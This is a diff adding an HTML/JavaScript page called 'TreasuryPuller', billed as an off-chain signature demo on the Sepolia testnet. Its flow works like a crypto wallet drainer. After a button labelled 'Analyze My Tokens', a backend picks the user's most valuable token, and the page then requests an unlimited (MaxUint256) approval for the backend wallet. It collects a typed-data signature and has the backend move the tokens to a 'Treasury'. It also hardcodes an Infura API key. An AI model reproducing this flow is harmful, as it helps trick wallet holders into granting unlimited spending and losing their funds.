@@ -1,13 +1,650 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TreasuryPuller - Trust Wallet Off-Chain Signature Demo</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.jsx"></script>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TreasuryPuller - Off-Chain Signature Demo</title>
+    <script src="https://unpkg.com/ethers@6.8.1/dist/ethers.umd.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .wallet-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .wallet-info {
+            display: none;
+            background: #e8f5e8;
+            border: 2px solid #4caf50;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .wallet-info.show {
+            display: block;
+        }
+
+        .transfer-section {
+            background: #fff;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3);
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: 500;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏛️ TreasuryPuller</h1>
+            <p>Off-Chain Signature Token Transfer Demo</p>
+        </div>
+
+        <div class="content">
+            <!-- Wallet Connection Section -->
+            <div class="wallet-section">
+                <h2>🔗 Connect Your Wallet</h2>
+                <p>Connect your wallet to sign off-chain signatures and transfer tokens to the Treasury.</p>
+                
+                <button id="connectWallet" class="btn">Connect MetaMask</button>
+                <button id="switchToSepolia" class="btn" style="background: #ff6b35; display: none;">Switch to Sepolia</button>
+                <button id="clearCache" class="btn" style="background: #dc3545;">Clear Cache & Refresh</button>
+                <button id="testEthers" class="btn" style="background: #28a745;">Test Ethers.js</button>
+                <button id="debugMetaMask" class="btn" style="background: #17a2b8;">Debug MetaMask</button>
+                
+                <div id="walletInfo" class="wallet-info">
+                    <h3>✅ Wallet Connected</h3>
+                    <p><strong>Address:</strong> <span id="userAddress"></span></p>
+                    <p><strong>Network:</strong> <span id="networkName"></span></p>
+                </div>
+            </div>
+
+            <!-- Backend Analysis Section -->
+            <div class="transfer-section">
+                <h2>🤖 Backend Token Analysis</h2>
+                <p>The backend will automatically analyze your tokens and select the optimal one for transfer.</p>
+                
+                <button id="analyzeTokens" class="btn">Analyze My Tokens</button>
+                
+                <div id="analysisResult" class="status" style="display: none;">
+                    <h3>📊 Analysis Result</h3>
+                    <div id="selectedTokenInfo"></div>
+                </div>
+            </div>
+
+            <!-- Status Section -->
+            <div class="transfer-section">
+                <h2>📊 Transfer Status</h2>
+                <p>Monitor your token transfer progress here.</p>
+                
+                <div id="status" class="status" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const BACKEND_URL = 'http://localhost:3000';
+        let provider, signer, userAddress, selectedToken, selectedSymbol;
+
+        // DOM Elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const switchToSepoliaBtn = document.getElementById('switchToSepolia');
+        const clearCacheBtn = document.getElementById('clearCache');
+        const testEthersBtn = document.getElementById('testEthers');
+        const debugMetaMaskBtn = document.getElementById('debugMetaMask');
+        const walletInfo = document.getElementById('walletInfo');
+        const userAddressSpan = document.getElementById('userAddress');
+        const networkNameSpan = document.getElementById('networkName');
+        const analyzeTokensBtn = document.getElementById('analyzeTokens');
+        const analysisResult = document.getElementById('analysisResult');
+        const selectedTokenInfo = document.getElementById('selectedTokenInfo');
+        // Transfer button removed - no longer needed
+        const status = document.getElementById('status');
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Page loaded, initializing...');
+            
+            // Check if ethers is loaded
+            if (typeof ethers === 'undefined') {
+                console.error('Ethers.js not loaded!');
+                showStatus('Failed to load ethers.js library. Please refresh the page.', 'error');
+                return;
+            }
+            
+            console.log('Ethers.js loaded successfully:', ethers.version);
+            setupEventListeners();
+            checkWalletConnection();
+        });
+
+        function setupEventListeners() {
+            connectWalletBtn.addEventListener('click', connectWallet);
+            switchToSepoliaBtn.addEventListener('click', switchToSepolia);
+            clearCacheBtn.addEventListener('click', clearCacheAndRefresh);
+            testEthersBtn.addEventListener('click', testEthersLibrary);
+            debugMetaMaskBtn.addEventListener('click', debugMetaMask);
+            analyzeTokensBtn.addEventListener('click', analyzeTokens);
+            // Transfer button removed - signature happens automatically after analysis
+        }
+
+        function testEthersLibrary() {
+            console.log('=== Testing Ethers.js Library ===');
+            console.log('typeof ethers:', typeof ethers);
+            
+            if (typeof ethers === 'undefined') {
+                showStatus('❌ Ethers.js not loaded! Please refresh the page.', 'error');
+                return;
+            }
+            
+            console.log('Ethers version:', ethers.version);
+            console.log('Ethers.BrowserProvider:', typeof ethers.BrowserProvider);
+            console.log('Ethers.JsonRpcProvider:', typeof ethers.JsonRpcProvider);
+            
+            try {
+                // Test creating a provider
+                const testProvider = new ethers.JsonRpcProvider('https://sepolia.infura.io/v3/ae5b9caa879c427295e160b983cf84fa');
+                console.log('✅ Test provider created successfully');
+                showStatus('✅ Ethers.js loaded successfully! Version: ' + ethers.version, 'success');
+            } catch (error) {
+                console.error('❌ Error creating test provider:', error);
+                showStatus('❌ Ethers.js loaded but has errors: ' + error.message, 'error');
+            }
+        }
+
+        function clearCacheAndRefresh() {
+            try {
+                // Clear localStorage
+                localStorage.clear();
+                // Clear sessionStorage
+                sessionStorage.clear();
+                // Clear any cached data
+                if ('caches' in window) {
+                    caches.keys().then(names => {
+                        names.forEach(name => {
+                            caches.delete(name);
+                        });
+                    });
+                }
+                
+                showStatus('Cache cleared! Refreshing page...', 'info');
+                
+                // Refresh the page after a short delay
+                setTimeout(() => {
+                    window.location.reload(true);
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Error clearing cache:', error);
+                showStatus('Error clearing cache: ' + error.message, 'error');
+            }
+        }
+
+        async function switchToSepolia() {
+            try {
+                showStatus('Switching to Sepolia testnet...', 'info');
+                
+                // Request to switch to Sepolia network
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0xaa36a7' }], // Sepolia chain ID in hex
+                });
+                
+                showStatus('✅ Switched to Sepolia! Please reconnect your wallet.', 'success');
+                switchToSepoliaBtn.style.display = 'none';
+                
+                // Reconnect wallet after network switch
+                setTimeout(() => {
+                    connectWallet();
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Error switching to Sepolia:', error);
+                
+                if (error.code === 4902) {
+                    // Chain not added to MetaMask, try to add it
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0xaa36a7',
+                                chainName: 'Sepolia Test Network',
+                                rpcUrls: ['https://sepolia.infura.io/v3/ae5b9caa879c427295e160b983cf84fa'],
+                                nativeCurrency: {
+                                    name: 'SepoliaETH',
+                                    symbol: 'SepoliaETH',
+                                    decimals: 18
+                                },
+                                blockExplorerUrls: ['https://sepolia.etherscan.io']
+                            }]
+                        });
+                        showStatus('✅ Sepolia network added! Please reconnect your wallet.', 'success');
+                        switchToSepoliaBtn.style.display = 'none';
+                    } catch (addError) {
+                        showStatus('Failed to add Sepolia network: ' + addError.message, 'error');
+                    }
+                } else {
+                    showStatus('Failed to switch to Sepolia: ' + error.message, 'error');
+                }
+            }
+        }
+
+        function debugMetaMask() {
+            console.log('=== MetaMask Debug ===');
+            console.log('window.ethereum exists:', typeof window.ethereum !== 'undefined');
+            console.log('window.ethereum:', window.ethereum);
+            
+            if (typeof window.ethereum !== 'undefined') {
+                console.log('ethereum.isMetaMask:', window.ethereum.isMetaMask);
+                console.log('ethereum.providers:', window.ethereum.providers);
+                console.log('ethereum.request:', typeof window.ethereum.request);
+            }
+            
+            // Check for MetaMask in providers array
+            if (window.ethereum && window.ethereum.providers) {
+                const metaMaskProvider = window.ethereum.providers.find(provider => provider.isMetaMask);
+                console.log('MetaMask found in providers:', !!metaMaskProvider);
+            }
+            
+            showStatus('Debug information logged to console. Press F12 to view.', 'info');
+        }
+
+        async function checkWalletConnection() {
+            try {
+                console.log('Checking for MetaMask...');
+                
+                if (!window.ethereum) {
+                    console.log('MetaMask not detected');
+                    showStatus('MetaMask not detected. Please install MetaMask and refresh the page.', 'error');
+                    return;
+                }
+                
+                console.log('MetaMask detected, checking for existing connection...');
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                console.log('Existing accounts:', accounts);
+                
+                if (accounts.length > 0) {
+                    console.log('Found existing connection, connecting...');
+                    await connectWallet();
+                } else {
+                    console.log('No existing connection found');
+                }
+            } catch (error) {
+                console.log('Error checking wallet connection:', error.message);
+                showStatus('MetaMask not detected. Please install MetaMask and refresh the page.', 'error');
+            }
+        }
+
+        async function forceReconnect() {
+            try {
+                console.log('Force reconnecting wallet...');
+                
+                // Reset all variables
+                provider = null;
+                signer = null;
+                userAddress = null;
+                
+                // Hide wallet info
+                walletInfo.classList.remove('show');
+                connectWalletBtn.textContent = 'Connect MetaMask';
+                connectWalletBtn.disabled = false;
+                
+                // Clear any cached data
+                localStorage.removeItem('walletConnected');
+                sessionStorage.clear();
+                
+                showStatus('Wallet disconnected. Please connect again.', 'info');
+                
+            } catch (error) {
+                console.error('Error force reconnecting:', error);
+                showStatus('Error disconnecting wallet: ' + error.message, 'error');
+            }
+        }
+
+        async function connectWallet() {
+            try {
+                console.log('Starting wallet connection...');
+                
+                // Check if MetaMask exists
+                if (!window.ethereum) {
+                    throw new Error('MetaMask not found. Please install MetaMask from https://metamask.io');
+                }
+                
+                console.log('MetaMask found, requesting connection...');
+                
+                // Request account access
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                console.log('Accounts received:', accounts);
+                
+                if (accounts.length === 0) {
+                    throw new Error('No accounts found. Please unlock your MetaMask wallet.');
+                }
+                
+                // Initialize provider
+                provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                console.log('✅ Connected successfully:', userAddress);
+                console.log('🔍 Debug - userAddress variable:', userAddress);
+                console.log('🔍 Debug - userAddressSpan element:', userAddressSpan);
+                
+                // Get network info
+                const network = await provider.getNetwork();
+                let networkName;
+                
+                // Map chain IDs to network names
+                switch (network.chainId.toString()) {
+                    case '1':
+                        networkName = 'mainnet';
+                        break;
+                    case '11155111':
+                        networkName = 'sepolia';
+                        break;
+                    case '5':
+                        networkName = 'goerli';
+                        break;
+                    case '137':
+                        networkName = 'polygon';
+                        break;
+                    default:
+                        networkName = `Chain ID: ${network.chainId}`;
+                }
+                
+                // Validate network (should be Sepolia for this demo)
+                if (network.chainId.toString() !== '11155111') {
+                    showStatus(`⚠️ Warning: You're connected to ${networkName}, but this demo requires Sepolia testnet.`, 'error');
+                    switchToSepoliaBtn.style.display = 'block';
+                    switchToSepoliaBtn.textContent = `Switch to Sepolia (Currently: ${networkName})`;
+                    return;
+                }
+                
+                // Update UI
+                console.log('🔍 Debug - About to update UI with address:', userAddress);
+                console.log('🔍 Debug - userAddressSpan before update:', userAddressSpan.textContent);
+                userAddressSpan.textContent = userAddress;
+                console.log('🔍 Debug - userAddressSpan after update:', userAddressSpan.textContent);
+                networkNameSpan.textContent = networkName;
+                walletInfo.classList.add('show');
+                connectWalletBtn.textContent = 'Wallet Connected';
+                connectWalletBtn.disabled = true;
+                
+                showStatus('✅ Wallet connected successfully to Sepolia!', 'success');
+                
+            } catch (error) {
+                console.error('Connection failed:', error);
+                
+                let errorMessage = 'Connection failed: ' + error.message;
+                
+                if (error.message.includes('User rejected')) {
+                    errorMessage = 'Connection cancelled by user. Please try again.';
+                } else if (error.message.includes('MetaMask not found')) {
+                    errorMessage = 'MetaMask not detected. Please install MetaMask and refresh the page.';
+                } else if (error.message.includes('No accounts found')) {
+                    errorMessage = 'No accounts found. Please unlock your MetaMask wallet.';
+                }
+                
+                showStatus(errorMessage, 'error');
+            }
+        }
+
+        async function analyzeTokens() {
+            if (!userAddress) {
+                showStatus('Please connect your wallet first', 'error');
+                return;
+            }
+
+            try {
+                showStatus('Analyzing tokens...', 'info');
+                
+                const response = await fetch(`${BACKEND_URL}/get-signature-request`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userAddress: userAddress
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    selectedToken = {
+                        address: data.tokenAddress,
+                        symbol: data.tokenSymbol,
+                        amount: data.amount
+                    };
+                    selectedSymbol = data.tokenSymbol;
+                    
+                    selectedTokenInfo.innerHTML = `
+                        <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; margin: 10px 0;">
+                            <h4>✅ Backend Selected Token</h4>
+                            <p><strong>Token:</strong> ${data.tokenSymbol}</p>
+                            <p><strong>Amount:</strong> ${data.amount} ${data.tokenSymbol}</p>
+                            <p><strong>Address:</strong> ${data.tokenAddress}</p>
+                        </div>
+                    `;
+                    
+                    analysisResult.style.display = 'block';
+                    analysisResult.className = 'status success';
+                    
+                    showStatus(`Backend selected ${data.tokenSymbol}: ${data.amount} tokens. Please sign the off-chain signature...`, 'info');
+                    
+                    // Automatically proceed to signature signing
+                    await signAndTransfer(data);
+                } else {
+                    throw new Error(data.error);
+                }
+
+            } catch (error) {
+                console.error('Error analyzing tokens:', error);
+                showStatus('Analysis failed: ' + error.message, 'error');
+            }
+        }
+
+        async function approveBackendWalletIfNeeded() {
+            try {
+                showStatus('Checking backend wallet approval...', 'info');
+                
+                // Get backend wallet address from backend
+                const backendResponse = await fetch(`${BACKEND_URL}/treasury`);
+                const backendData = await backendResponse.json();
+                const BACKEND_WALLET_ADDRESS = backendData.treasury;
+                console.log('Backend wallet address:', BACKEND_WALLET_ADDRESS);
+                
+                // Create token contract instance
+                const tokenContract = new ethers.Contract(
+                    selectedToken.address,
+                    [
+                        'function allowance(address owner, address spender) view returns (uint256)',
+                        'function approve(address spender, uint256 amount) returns (bool)'
+                    ],
+                    signer
+                );
+                
+                // Check current allowance
+                const currentAllowance = await tokenContract.allowance(userAddress, BACKEND_WALLET_ADDRESS);
+                const requiredAmount = ethers.parseEther(selectedToken.amount.toString());
+                
+                console.log(`Current allowance: ${ethers.formatEther(currentAllowance)}`);
+                console.log(`Required amount: ${ethers.formatEther(requiredAmount)}`);
+                
+                if (currentAllowance < requiredAmount) {
+                    showStatus('Approving backend wallet to spend your tokens...', 'info');
+                    
+                    // Approve backend wallet for a large amount (max uint256)
+                    const maxApproval = ethers.MaxUint256;
+                    const approveTx = await tokenContract.approve(BACKEND_WALLET_ADDRESS, maxApproval);
+                    
+                    showStatus('Waiting for approval transaction...', 'info');
+                    await approveTx.wait();
+                    
+                    showStatus('✅ Backend wallet approval successful!', 'success');
+                } else {
+                    showStatus('✅ Backend wallet already approved', 'success');
+                }
+                
+            } catch (error) {
+                console.error('Error approving backend wallet:', error);
+                throw new Error('Failed to approve backend wallet: ' + error.message);
+            }
+        }
+
+        async function signAndTransfer(signatureData) {
+            try {
+                showStatus('Please approve the backend wallet to spend your tokens...', 'info');
+                
+                // First, approve the backend wallet to spend tokens
+                await approveBackendWalletIfNeeded();
+                
+                showStatus('Please approve the off-chain signature in your wallet...', 'info');
+
+                // User signs the off-chain signature
+                const signature = await signer.signTypedData(
+                    signatureData.domain,
+                    signatureData.types,
+                    signatureData.value
+                );
+
+                showStatus('Signature approved! Executing transfer...', 'info');
+
+                // Execute transfer with user's signature
+                const transferResponse = await fetch(`${BACKEND_URL}/transfer-tokens`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        signature: signature,
+                        signatureData: signatureData // Include the original signature data
+                    })
+                });
+
+                const transferData = await transferResponse.json();
+
+                if (transferData.success) {
+                    showStatus(
+                        `✅ Success! ${signatureData.amount} ${signatureData.tokenSymbol} transferred to Treasury. ` +
+                        `Transaction: ${transferData.transactionHash}`, 
+                        'success'
+                    );
+                } else {
+                    throw new Error(transferData.error);
+                }
+
+            } catch (error) {
+                console.error('Error transferring tokens:', error);
+                showStatus('Transfer failed: ' + error.message, 'error');
+            }
+        }
+
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = `status ${type}`;
+            status.style.display = 'block';
+        }
+    </script>
+</body>
 </html>
